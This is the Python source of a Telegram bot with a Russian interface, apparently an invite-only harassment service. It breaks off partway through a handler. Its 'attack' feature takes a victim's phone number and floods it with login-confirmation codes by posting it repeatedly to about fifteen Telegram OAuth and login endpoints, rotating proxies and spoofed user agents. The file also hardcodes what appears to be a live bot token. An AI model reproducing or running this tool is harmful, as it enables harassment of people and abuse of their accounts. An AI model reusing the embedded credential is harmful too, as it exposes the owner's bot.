import telebot
from telebot import types
from fake_useragent import UserAgent
import requests
import random
import time
import threading
import uuid
import sqlite3
import os
import sys
import atexit
import signal
import logging
import tenacity
import psutil

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- Lock File to Prevent Multiple Instances ---
LOCK_FILE = os.path.abspath("bot.lock")

def acquire_lock():
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    logger.error(f"Another instance of the bot is running with PID {pid}.")
                    sys.exit(1)
                else:
                    logger.warning(f"Stale lock file found for PID {pid}. Removing it.")
                    os.remove(LOCK_FILE)
        except (ValueError, IOError):
            logger.warning("Invalid or unreadable lock file. Removing it.")
            os.remove(LOCK_FILE)
    with open(LOCK_FILE, 'w') as f:
        f.write(str(os.getpid()))

def release_lock():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)

# Handle termination signals (e.g., Ctrl+C)
def signal_handler(sig, frame):
    logger.info("Bot interrupted, cleaning up...")
    release_lock()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Acquire lock at startup
acquire_lock()
atexit.register(release_lock)

# --- Configuration ---
BOT_TOKEN = "8566510489:AAE3FYolikidOwARBMAWdhG6o4bv_axLe30"
bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to store ongoing attacks for cancellation
ongoing_attacks = {}

# Admin user ID who can generate invites and use bot without invite
ADMIN_USER_ID = 8209808991

# Load proxies from proxy.txt
try:
    with open('proxy.txt', 'r') as f:
        proxies_list = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    proxies_list = []
    logger.warning("proxy.txt not found. Running without proxies.")

# --- Database Setup ---
def init_db():
    """Initialize the SQLite database and create the invites and support_tickets tables."""
    db_file = 'invites.db'
    if os.path.exists(db_file):
        try:
            conn = sqlite3.connect(db_file)
            conn.execute('SELECT 1 FROM sqlite_master WHERE type="table"')
            conn.close()
        except sqlite3.DatabaseError:
            logger.error(f"{db_file} is corrupted or not a valid SQLite database. Deleting and recreating it.")
            os.remove(db_file)
    
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS invites (
                invite_code TEXT PRIMARY KEY,
                used BOOLEAN NOT NULL,
                user_id INTEGER,
                CONSTRAINT unique_user_id UNIQUE (user_id)
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS support_tickets (
                ticket_id TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                message TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'open',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Error initializing database: {e}")
        sys.exit(1)
    finally:
        conn.close()

# Initialize the database
init_db()

# --- Helper Functions ---
def is_user_authorized(user_id):
    """Check if user is authorized to use the bot."""
    if user_id == ADMIN_USER_ID:
        return True
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM invites WHERE user_id = ? AND used = ?', (user_id, True))
        result = cursor.fetchone()
        conn.close()
        return result is not None
    except sqlite3.Error as e:
        logger.error(f"Error checking user authorization: {e}")
        return False

def generate_invite_code():
    """Generate a unique invite code."""
    return str(uuid.uuid4())

def save_invite_code(invite_code, used=False, user_id=None):
    """Save an invite code to the database."""
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO invites (invite_code, used, user_id) VALUES (?, ?, ?)',
                      (invite_code, used, user_id))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Error saving invite code: {e}")

def update_invite_code(invite_code, used, user_id):
    """Update an invite code's status and user_id in the database."""
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE invites SET used = ?, user_id = ? WHERE invite_code = ?',
                      (used, user_id, invite_code))
        conn.commit()
    except sqlite3.IntegrityError:
        conn.rollback()
        raise ValueError("This user is already associated with another invite code.")
    except sqlite3.Error as e:
        logger.error(f"Error updating invite code: {e}")
        raise
    finally:
        conn.close()

def get_invite_code(invite_code):
    """Retrieve an invite code's data from the database."""
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('SELECT used, user_id FROM invites WHERE invite_code = ?', (invite_code,))
        result = cursor.fetchone()
        conn.close()
        return {'used': result[0], 'user_id': result[1]} if result else None
    except sqlite3.Error as e:
        logger.error(f"Error retrieving invite code: {e}")
        return None

def save_support_ticket(user_id, message):
    """Save a support ticket to the database."""
    ticket_id = str(uuid.uuid4())
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO support_tickets (ticket_id, user_id, message, status) VALUES (?, ?, ?, ?)',
                      (ticket_id, user_id, message, 'open'))
        conn.commit()
        conn.close()
        return ticket_id
    except sqlite3.Error as e:
        logger.error(f"Error saving support ticket: {e}")
        return None

def update_ticket_status(ticket_id, status):
    """Update the status of a support ticket."""
    try:
        conn = sqlite3.connect('invites.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE support_tickets SET status = ? WHERE ticket_id = ?', (status, ticket_id))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Error updating ticket status: {e}")

def get_support_ticket(ticket_id):
    """Retrieve a support ticket's data from the database."""
    try:
        conn = sqlite3.connect('/data/invites.db')
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, message, status FROM support_tickets WHERE ticket_id = ?', (ticket_id,))
        result = cursor.fetchone()
        conn.close()
        return {'user_id': result[0], 'message': result[1], 'status': result[2]} if result else None
    except sqlite3.Error as e:
        logger.error(f"Error retrieving support ticket: {e}")
        return None

# --- Clear Telegram Update Queue ---
def clear_telegram_updates():
    """Clear Telegram Update Queue: Added clear_telegram_updates to reset the Telegram API's getUpdates queue before starting polling, preventing conflicts from stale requests."""
    try:
        response = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset=-1")
        if response.status_code == 200:
            logger.info("Telegram update queue cleared successfully.")
        else:
            logger.warning(f"Failed to clear Telegram update queue: {response.status_code} {response.text}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error clearing Telegram update queue: {e}")

# --- Attack Functions ---
def flood_codes_request(number):
    urls_to_flood = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://translations.telegram.org/auth/request',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Fwww.botobot.ru%2F',
        'https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin',
        'https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://my.telegram.org/auth/send_password'
    ]
    user_agent = UserAgent().random
    headers = {'user-agent': user_agent}

    successful_requests = 0
    errors = []

    for url in urls_to_flood:
        proxy = random.choice(proxies_list) if proxies_list else None
        proxies = {'http': f'http://{proxy}'} if proxy else None
        try:
            response = requests.post(url, headers=headers, data={'phone': number}, proxies=proxies, timeout=5)
            if response.status_code == 200:
                successful_requests += 1
            else:
                errors.append(f"Код: {response.status_code}")
        except requests.exceptions.RequestException as e:
            errors.append(f"Ошибка: {e}")
    return successful_requests, len(urls_to_flood), errors

# --- Bot Handlers ---
def get_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    btn_attack = types.KeyboardButton("💥 Начать Атаку")
    btn_support = types.KeyboardButton("📞 Связь с техподдержкой")
    if user_id == ADMIN_USER_ID:
        btn_generate_invite = types.KeyboardButton("🛠 Генерировать код приглашения")
        btn_invite = types.KeyboardButton("🔑 Ввести код приглашения")
        markup.add(btn_attack, btn_support, btn_invite, btn_generate_invite)
    elif not is_user_authorized(user_id):
        btn_invite = types.KeyboardButton("🔑 Ввести код приглашения")
        markup.add(btn_attack, btn_invite)
    else:
        markup.add(btn_attack, btn_support)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_authorized(message.from_user.id):
        welcome_message = (
            "👋 <b>Привет! Я бот для выполнения различных операций с Telegram.</b>\n\n"
            "Я могу помочь вам с:\n"
            "1. <b>Флудом кодов</b> (отправка кодов подтверждения на номер).\n"
            "2. <b>Связь с техподдержкой</b> (обратитесь к администратору за помощью).\n\n"
            "Выберите действие в меню ниже!"
        )
        safe_send_message(message.chat.id, welcome_message, parse_mode='HTML', reply_markup=get_main_keyboard(message.from_user.id))
    else:
        safe_send_message(
            message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения, чтобы получить доступ.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )

@bot.message_handler(func=lambda message: message.text == "🔑 Ввести код приглашения")
def request_invite_code(message):
    msg = safe_send_message(
        message.chat.id,
        "Введите код приглашения:",
        parse_mode='HTML',
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
            types.KeyboardButton("Отмена")
        )
    )
    bot.register_next_step_handler(msg, process_invite_code)

def process_invite_code(message):
    if message.text == "Отмена":
        safe_send_message(message.chat.id, "Действие отменено.", parse_mode='HTML', reply_markup=get_main_keyboard(message.from_user.id))
        return

    if not message.text:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Ошибка: Пожалуйста, введите текстовый код приглашения.</b>",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("Отмена")
            )
        )
        bot.register_next_step_handler(msg, process_invite_code)
        return

    invite_code = message.text.strip()
    invite_data = get_invite_code(invite_code)
    if invite_data and not invite_data['used']:
        try:
            update_invite_code(invite_code, True, message.from_user.id)
            safe_send_message(
                message.chat.id,
                f"✅ <b>Код приглашения принят!</b> Ваш ID ({message.from_user.id}) привязан к этому коду. Теперь вы можете использовать бота.",
                parse_mode='HTML',
                reply_markup=get_main_keyboard(message.from_user.id)
            )
            send_welcome(message)
        except ValueError as e:
            msg = safe_send_message(
                message.chat.id,
                f"❌ <b>Ошибка:</b> {str(e)} Попробуйте другой код приглашения.",
                parse_mode='HTML',
                reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                    types.KeyboardButton("Отмена")
                )
            )
            bot.register_next_step_handler(msg, process_invite_code)
    else:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Неверный или уже использованный код приглашения.</b> Попробуйте ещё раз.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("Отмена")
            )
        )
        bot.register_next_step_handler(msg, process_invite_code)

@bot.message_handler(func=lambda message: message.text == "🛠 Генерировать код приглашения")
def generate_invite(message):
    if message.from_user.id != ADMIN_USER_ID:
        safe_send_message(message.chat.id, "❌ <b>У вас нет прав для генерации кодов приглашения.</b>", parse_mode='HTML', reply_markup=get_main_keyboard(message.from_user.id))
        return

    invite_code = generate_invite_code()
    save_invite_code(invite_code, used=False, user_id=None)
    safe_send_message(
        message.chat.id,
        f"✅ <b>Новый код приглашения сгенерирован:</b>\n<code>{invite_code}</code>\n"
        "Поделитесь этим кодом с пользователем, которого хотите пригласить.",
        parse_mode='HTML',
        reply_markup=get_main_keyboard(message.from_user.id)
    )

@bot.message_handler(func=lambda message: message.text == "📞 Связь с техподдержкой")
def request_support_message(message):
    if not is_user_authorized(message.from_user.id):
        safe_send_message(
            message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения, чтобы получить доступ к техподдержке.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )
        return

    msg = safe_send_message(
        message.chat.id,
        "Введите ваше сообщение для техподдержки:",
        parse_mode='HTML',
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
            types.KeyboardButton("Отмена")
        )
    )
    bot.register_next_step_handler(msg, process_support_message)

def process_support_message(message):
    if message.text == "Отмена":
        safe_send_message(message.chat.id, "Действие отменено.", parse_mode='HTML', reply_markup=get_main_keyboard(message.from_user.id))
        return

    if not message.text:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Ошибка: Пожалуйста, введите текстовое сообщение для техподдержки.</b>",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("Отмена")
            )
        )
        bot.register_next_step_handler(msg, process_support_message)
        return

    user_id = message.from_user.id
    support_message = message.text.strip()
    
    ticket_id = save_support_ticket(user_id, support_message)
    if not ticket_id:
        safe_send_message(
            message.chat.id,
            "❌ <b>Ошибка при создании обращения.</b> Пожалуйста, попробуйте снова.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(user_id)
        )
        return

    try:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("Ответить", callback_data=f"reply_support_{ticket_id}_{user_id}"))
        safe_send_message(
            ADMIN_USER_ID,
            f"📩 <b>Новое обращение в техподдержку (ID: {ticket_id})</b>\n"
            f"От пользователя ID {user_id}:\n\n{support_message}",
            parse_mode='HTML',
            reply_markup=markup
        )
        safe_send_message(
            message.chat.id,
            f"✅ <b>Ваше обращение (ID: {ticket_id}) успешно отправлено техподдержке!</b> Ожидайте ответа.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(user_id)
        )
    except telebot.apihelper.ApiTelegramException as e:
        logger.error(f"Error sending support message to admin: {e}")
        safe_send_message(
            message.chat.id,
            f"❌ <b>Ошибка при отправке обращения:</b> {str(e)}. Пожалуйста, попробуйте позже.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(user_id)
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_support_"))
def reply_support_handler(call):
    if call.from_user.id != ADMIN_USER_ID:
        safe_send_message(
            call.message.chat.id,
            "❌ <b>У вас нет прав для ответа на обращения.</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(call.from_user.id)
        )
        bot.answer_callback_query(call.id)
        return

    logger.info(f"Received callback data: {call.data}")

    try:
        parts = call.data.split("_", 3)
        if len(parts) != 4 or parts[0] + "_" + parts[1] != "reply_support":
            raise ValueError("Invalid callback data format")
        ticket_id, user_id = parts[2], parts[3]
        user_id = int(user_id)
    except (ValueError, IndexError) as e:
        logger.error(f"Error parsing callback data: {e}")
        safe_send_message(
            call.message.chat.id,
            "❌ <b>Ошибка: Неверный формат запроса.</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(call.from_user.id)
        )
        bot.answer_callback_query(call.id)
        return

    ticket = get_support_ticket(ticket_id)
    if not ticket or ticket['status'] != 'open':
        safe_send_message(
            call.message.chat.id,
            "❌ <b>Обращение не найдено или уже закрыто.</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(call.from_user.id)
        )
        bot.answer_callback_query(call.id)
        return

    bot.answer_callback_query(call.id)
    msg = safe_send_message(
        call.message.chat.id,
        f"Введите ответ для пользователя ID {user_id} (Обращение ID: {ticket_id}):",
        parse_mode='HTML',
        reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
            types.KeyboardButton("Отмена")
        )
    )
    bot.register_next_step_handler(msg, lambda m: process_support_reply(m, ticket_id, user_id))

def process_support_reply(message, ticket_id, user_id):
    if message.text == "Отмена":
        safe_send_message(message.chat.id, "Действие отменено.", parse_mode='HTML', reply_markup=get_main_keyboard(message.from_user.id))
        return

    if not message.text:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Ошибка: Пожалуйста, введите текстовое сообщение для ответа.</b>",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("Отмена")
            )
        )
        bot.register_next_step_handler(msg, lambda m: process_support_reply(m, ticket_id, user_id))
        return

    reply_message = message.text.strip()
    try:
        safe_send_message(
            user_id,
            f"📬 <b>Ответ от техподдержки (Обращение ID: {ticket_id}):</b>\n\n{reply_message}",
            parse_mode='HTML'
        )
        update_ticket_status(ticket_id, 'closed')
        safe_send_message(
            message.chat.id,
            f"✅ <b>Ответ успешно отправлен пользователю ID {user_id} (Обращение ID: {ticket_id}).</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )
    except telebot.apihelper.ApiTelegramException as e:
        logger.error(f"Error sending reply to user {user_id}: {e}")
        safe_send_message(
            message.chat.id,
            f"❌ <b>Ошибка при отправке ответа:</b> {str(e)}. Пожалуйста, попробуйте снова.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )

@bot.message_handler(func=lambda message: message.text == "💥 Начать Атаку")
def start_attack_menu(message):
    if not is_user_authorized(message.from_user.id):
        safe_send_message(
            message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )
        return

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Флуд кодами", callback_data="attack_flood"))
    safe_send_message(message.chat.id, "Выберите тип атаки:", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("attack_"))
def choose_attack_type(call):
    if not is_user_authorized(call.from_user.id):
        safe_send_message(
            call.message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )
        bot.answer_callback_query(call.id)
        return

    attack_type = call.data.split("_")[1]
    bot.answer_callback_query(call.id)

    if attack_type == "flood":
        msg = safe_send_message(
            call.message.chat.id,
            "Введите номер телефона в международном формате (например, <code>+79123456789</code>, <code>+14155552671</code>):",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(call.from_user.id)
        )
        bot.register_next_step_handler(msg, get_flood_number)

def get_flood_number(message):
    if not is_user_authorized(message.from_user.id):
        safe_send_message(
            message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )
        return

    if not message.text:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Ошибка: Пожалуйста, введите текстовый номер телефона.</b>",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )
        bot.register_next_step_handler(msg, get_flood_number)
        return

    number = message.text.strip()
    
    # Проверка формата номера (международный формат)
    if not number.startswith('+') or len(number) < 8:
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Некорректный номер телефона.</b> Пожалуйста, введите номер в международном формате:\n"
            "<code>+79123456789</code> (Россия)\n"
            "<code>+14155552671</code> (США)\n"
            "<code>+447911123456</code> (Великобритания)\n"
            "<code>+4915123456789</code> (Германия)\n"
            "и т.д.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )
        bot.register_next_step_handler(msg, get_flood_number)
        return
    
    # Проверяем что после + только цифры
    if not all(c.isdigit() for c in number[1:]):
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Некорректный номер телефона.</b> После знака '+' должны быть только цифры.",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )
        bot.register_next_step_handler(msg, get_flood_number)
        return
    
    # Проверяем длину номера (минимальная длина с кодом страны)
    if len(number) < 9:  # +1 + код страны + номер
        msg = safe_send_message(
            message.chat.id,
            "❌ <b>Номер слишком короткий.</b> Минимальная длина номера с кодом страны: 9 символов (например, +12345678).",
            parse_mode='HTML',
            reply_markup=get_main_keyboard(message.from_user.id)
        )
        bot.register_next_step_handler(msg, get_flood_number)
        return
    
    # Start the flood attack in a new thread
    thread = threading.Thread(target=perform_flood_attack, args=(message.chat.id, message.from_user.id, number))
    thread.start()

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 Остановить атаку", callback_data=f"stop_attack_{message.from_user.id}"))
    safe_send_message(
        message.chat.id,
        "⏳ <b>Начинаю флуд кодами... Это может занять некоторое время.</b>",
        parse_mode='HTML',
        reply_markup=markup
    )
    ongoing_attacks[message.from_user.id] = True  # Mark attack as ongoing

def perform_flood_attack(chat_id, user_id, number):
    try:
        message_to_edit = safe_send_message(chat_id, "🔢 <b>Флуд: 0/127...</b>", parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        logger.error(f"Error sending initial flood message: {e}")
        return

    successful_requests_count = 0
    
    for i in range(1, 128):
        if user_id not in ongoing_attacks or not ongoing_attacks[user_id]:
            try:
                safe_edit_message_text(
                    chat_id=chat_id,
                    message_id=message_to_edit.message_id,
                    text=f"✅ <b>Флуд кодами остановлен пользователем.</b> Обработано <code>{i-1}/127</code> итераций.",
                    parse_mode='HTML',
                    reply_markup=get_main_keyboard(user_id)
                )
            except telebot.apihelper.ApiTelegramException as e:
                logger.error(f"Error editing flood message: {e}")
            break

        current_batch_successful, total_urls, current_batch_errors = flood_codes_request(number)
        successful_requests_count += current_batch_successful

        status_text_number = (i % 4) + 1
        status_emoji = "✅" if not current_batch_errors else "❌"
        try:
            safe_edit_message_text(
                chat_id=chat_id,
                message_id=message_to_edit.message_id,
                text=f"🔢 <b>Флуд: {i}/127...</b> Меняю числа на: <code>{status_text_number}</code>. Последняя итерация: {status_emoji} (<code>{current_batch_successful}</code> успешно).\n"
                     f"Всего успешно: <code>{successful_requests_count}</code>",
                parse_mode='HTML'
            )
        except telebot.apihelper.ApiTelegramException as e:
            logger.error(f"Error updating flood message: {e}")
            break
        time.sleep(0.01)

    if user_id in ongoing_attacks and ongoing_attacks[user_id]:
        try:
            safe_edit_message_text(
                chat_id=chat_id,
                message_id=message_to_edit.message_id,
                text=f"✅ <b>Атака 'Флуд кодами' завершена!</b> Отправлено <code>{successful_requests_count}</code> запросов на номер <code>{number}</code>.",
                parse_mode='HTML',
                reply_markup=get_main_keyboard(user_id)
            )
        except telebot.apihelper.ApiTelegramException as e:
            logger.error(f"Error sending final flood message: {e}")

    if user_id in ongoing_attacks:
        del ongoing_attacks[user_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_attack_"))
def stop_attack_handler(call):
    if not is_user_authorized(call.from_user.id):
        safe_send_message(
            call.message.chat.id,
            "❌ <b>Доступ запрещён.</b> Пожалуйста, введите код приглашения.",
            parse_mode='HTML',
            reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(
                types.KeyboardButton("🔑 Ввести код приглашения")
            )
        )
        bot.answer_callback_query(call.id)
        return

    try:
        user_id = int(call.data.split("_")[2])
    except (ValueError, IndexError) as e:
        logger.error(f"Error parsing stop_attack callback data: {e}")
        safe_send_message(
            call.message.chat.id,
            "❌ <b>Ошибка: Неверный